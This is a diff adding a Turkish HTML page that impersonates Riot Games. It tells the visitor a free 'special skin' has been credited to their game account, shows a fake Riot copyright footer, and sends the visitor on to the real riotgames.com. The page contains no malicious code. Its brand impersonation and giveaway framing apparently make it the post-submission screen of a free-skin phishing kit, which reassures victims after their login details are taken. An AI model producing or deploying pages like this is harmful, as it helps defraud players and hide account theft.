@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="İşlem Başarılı">
+    <link rel="icon" type="image/png" href="favicon.png">
+    <link rel="shortcut icon" type="image/png" href="favicon.png">
+    <title>Başarılı - Riot Games</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: #1a1a1a;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Arka plan */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-image: 
+                linear-gradient(rgba(0, 0, 0, 0.4), rgba(0, 0, 0, 0.4)),
+                url('bannerpc.PNG');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            z-index: 0;
+        }
+
+        /* Logo */
+        .top-logo {
+            position: absolute;
+            top: 40px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 100;
+            text-align: center;
+        }
+
+        .top-logo img {
+            height: 50px;
+            width: auto;
+            display: block;
+            margin: 0 auto;
+        }
+
+        /* Success Container */
+        .success-wrapper {
+            position: relative;
+            z-index: 10;
+            width: 100%;
+            max-width: 520px;
+            padding: 20px;
+        }
+
+        .success-container {
+            background: #ffffff;
+            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.5);
+            padding: 60px 50px;
+            text-align: center;
+        }
+
+        /* Success Animation */
+        .success-animation {
+            margin: 0 auto 30px;
+            position: relative;
+            width: 120px;
+            height: 120px;
+        }
+
+        .success-circle {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #0cce6b 0%, #0a9c52 100%);
+            box-shadow: 0 4px 20px rgba(12, 206, 107, 0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: scaleIn 0.5s ease-out;
+        }
+
+        @keyframes scaleIn {
+            0% {
+                transform: scale(0);
+                opacity: 0;
+            }
+            50% {
+                transform: scale(1.1);
+            }
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        .checkmark {
+            width: 60px;
+            height: 60px;
+            stroke: white;
+            stroke-width: 4;
+            stroke-linecap: round;
+            fill: none;
+            animation: checkmark 0.6s ease-in-out 0.3s both;
+        }
+
+        @keyframes checkmark {
+            0% {
+                stroke-dashoffset: 100;
+                stroke-dasharray: 100;
+            }
+            100% {
+                stroke-dashoffset: 0;
+                stroke-dasharray: 100;
+            }
+        }
+
+        /* Particles */
+        .particle {
+            position: absolute;
+            border-radius: 50%;
+            background: #0cce6b;
+            animation: float 2s ease-in-out infinite;
+        }
+
+        .particle:nth-child(1) {
+            width: 8px;
+            height: 8px;
+            top: 10%;
+            left: 10%;
+            animation-delay: 0s;
+        }
+
+        .particle:nth-child(2) {
+            width: 6px;
+            height: 6px;
+            top: 20%;
+            right: 15%;
+            animation-delay: 0.3s;
+        }
+
+        .particle:nth-child(3) {
+            width: 10px;
+            height: 10px;
+            bottom: 15%;
+            left: 15%;
+            animation-delay: 0.6s;
+        }
+
+        .particle:nth-child(4) {
+            width: 7px;
+            height: 7px;
+            bottom: 20%;
+            right: 10%;
+            animation-delay: 0.9s;
+        }
+
+        @keyframes float {
+            0%, 100% {
+                transform: translateY(0px);
+                opacity: 0.6;
+            }
+            50% {
+                transform: translateY(-15px);
+                opacity: 1;
+            }
+        }
+
+        /* Text */
+        .success-title {
+            font-size: 28px;
+            font-weight: 700;
+            color: #0cce6b;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            animation: fadeInUp 0.6s ease-out 0.4s both;
+        }
+
+        .success-message {
+            font-size: 18px;
+            color: #292929;
+            line-height: 1.6;
+            margin-bottom: 15px;
+            animation: fadeInUp 0.6s ease-out 0.6s both;
+        }
+
+        .success-submessage {
+            font-size: 14px;
+            color: #666;
+            line-height: 1.5;
+            margin-bottom: 35px;
+            animation: fadeInUp 0.6s ease-out 0.8s both;
+        }
+
+        @keyframes fadeInUp {
+            0% {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Skin Preview */
+        .skin-preview {
+            background: linear-gradient(135deg, #f5f5f5 0%, #e0e0e0 100%);
+            padding: 25px;
+            border-radius: 8px;
+            margin: 30px 0;
+            animation: fadeInUp 0.6s ease-out 1s both;
+        }
+
+        .skin-preview-title {
+            font-size: 12px;
+            font-weight: 700;
+            color: #666;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 15px;
+        }
+
+        .skin-icon {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto;
+            background: linear-gradient(135deg, #eb0029 0%, #c7001f 100%);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 15px rgba(235, 0, 41, 0.3);
+        }
+
+        .skin-icon::before {
+            content: '🎁';
+            font-size: 40px;
+        }
+
+        .skin-name {
+            margin-top: 15px;
+            font-size: 16px;
+            font-weight: 700;
+            color: #292929;
+        }
+
+        /* Button */
+        .continue-button {
+            display: inline-block;
+            padding: 16px 50px;
+            background: linear-gradient(135deg, #eb0029 0%, #c7001f 100%);
+            color: white;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            border-radius: 50px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(235, 0, 41, 0.3);
+            animation: fadeInUp 0.6s ease-out 1.2s both;
+        }
+
+        .continue-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(235, 0, 41, 0.4);
+        }
+
+        .continue-button:active {
+            transform: translateY(0);
+        }
+
+        /* Footer */
+        .footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            z-index: 10;
+            padding: 25px 20px 30px;
+            text-align: center;
+        }
+
+        .footer-text {
+            font-size: 10px;
+            color: rgba(255, 255, 255, 0.6);
+            line-height: 1.6;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .top-logo {
+                top: 25px;
+            }
+
+            .top-logo img {
+                height: 42px;
+            }
+
+            .success-container {
+                padding: 50px 35px;
+            }
+
+            .success-title {
+                font-size: 24px;
+            }
+
+            .success-message {
+                font-size: 16px;
+            }
+
+            .success-circle {
+                width: 100px;
+                height: 100px;
+            }
+
+            .checkmark {
+                width: 50px;
+                height: 50px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .top-logo {
+                top: 20px;
+            }
+
+            .top-logo img {
+                height: 38px;
+            }
+
+            .success-container {
+                padding: 40px 25px;
+            }
+
+            .success-title {
+                font-size: 22px;
+            }
+
+            .success-message {
+                font-size: 15px;
+            }
+
+            .success-circle {
+                width: 90px;
+                height: 90px;
+            }
+
+            .checkmark {
+                width: 45px;
+                height: 45px;
+            }
+
+            .continue-button {
+                padding: 14px 40px;
+                font-size: 13px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Logo -->
+    <div class="top-logo">
+        <img src="ccc.png" alt="Riot Games">
+    </div>
+
+    <!-- Success Content -->
+    <div class="success-wrapper">
+        <div class="success-container">
+            <!-- Success Animation -->
+            <div class="success-animation">
+                <div class="success-circle">
+                    <svg class="checkmark" viewBox="0 0 52 52">
+                        <path d="M14 27l8 8 16-16"/>
+                    </svg>
+                </div>
+                <div class="particle"></div>
+                <div class="particle"></div>
+                <div class="particle"></div>
+                <div class="particle"></div>
+            </div>
+
+            <!-- Success Text -->
+            <h1 class="success-title">İşlem Başarılı!</h1>
+            <p class="success-message">
+                🎮 Özel ücretsiz skininiz hesabınıza başarıyla aktarılmıştır!
+            </p>
+            <p class="success-submessage">
+                Hediyeniz 24 saat içinde oyun hesabınızda görünecektir.<br>
+                Oyunun tadını çıkarın!
+            </p>
+
+            <!-- Skin Preview -->
+            <div class="skin-preview">
+                <div class="skin-preview-title">Kazandığınız Ödül</div>
+                <div class="skin-icon"></div>
+                <div class="skin-name">Özel Ücretsiz Skin</div>
+            </div>
+
+            <!-- Continue Button -->
+            <a href="https://www.riotgames.com" class="continue-button">
+                Oyuna Dön
+            </a>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        <div class="footer-text">
+            © 2024 Riot Games, Inc. Tüm hakları saklıdır.
+        </div>
+    </div>
+</body>
+</html>
+
